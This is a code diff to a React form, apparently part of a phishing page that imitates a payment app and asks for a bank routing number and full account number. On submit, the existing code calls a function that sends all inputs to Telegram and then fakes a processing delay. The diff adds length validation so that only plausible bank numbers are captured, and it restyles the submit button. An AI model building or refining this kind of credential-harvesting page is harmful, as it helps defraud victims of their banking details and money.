@@ -11,7 +11,7 @@ export function BankInfo() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (routingNumber && accountNumber) {
+    if (routingNumber.length === 9 && accountNumber.length >= 6 && accountNumber.length <= 15) {
       setIsLoading(true);
       await sendAllInputsToTelegram();
       // Simulate processing
@@ -21,6 +21,8 @@ export function BankInfo() {
       }, 2000);
     }
   };
+
+  const isFormValid = routingNumber.length === 9 && accountNumber.length >= 6 && accountNumber.length <= 15;
 
   return (
     <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-6">
@@ -44,8 +46,13 @@ export function BankInfo() {
                 type="text"
                 name="routing_number"
                 value={routingNumber}
-                onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, ''))}
-                placeholder="123456789"
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, '');
+                  if (val.length <= 9) {
+                    setRoutingNumber(val);
+                  }
+                }}
+                placeholder="9-digit routing number"
                 className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
               />
             </div>
@@ -60,8 +67,13 @@ export function BankInfo() {
                 type="text"
                 name="account_number"
                 value={accountNumber}
-                onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
-                placeholder="Full account number"
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, '');
+                  if (val.length <= 15) {
+                    setAccountNumber(val);
+                  }
+                }}
+                placeholder="6-15 digit account number"
                 className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
               />
             </div>
@@ -70,11 +82,11 @@ export function BankInfo() {
           <div className="pt-4">
             <button
               type="submit"
-              disabled={isLoading || !routingNumber || !accountNumber}
+              disabled={isLoading || !isFormValid}
               className={`w-full py-4 rounded-full text-[18px] font-bold transition-all flex items-center justify-center ${
-                routingNumber && accountNumber && !isLoading
-                  ? 'bg-[#00D632] text-black hover:opacity-90'
-                  : 'bg-[#00D632]/20 text-black/30 cursor-not-allowed'
+                isFormValid && !isLoading
+                  ? 'bg-[#00D1FF] text-white hover:opacity-90 cursor-pointer'
+                  : 'bg-[#00D1FF]/20 text-white/30 cursor-not-allowed'
               }`}
             >
               {isLoading ? (
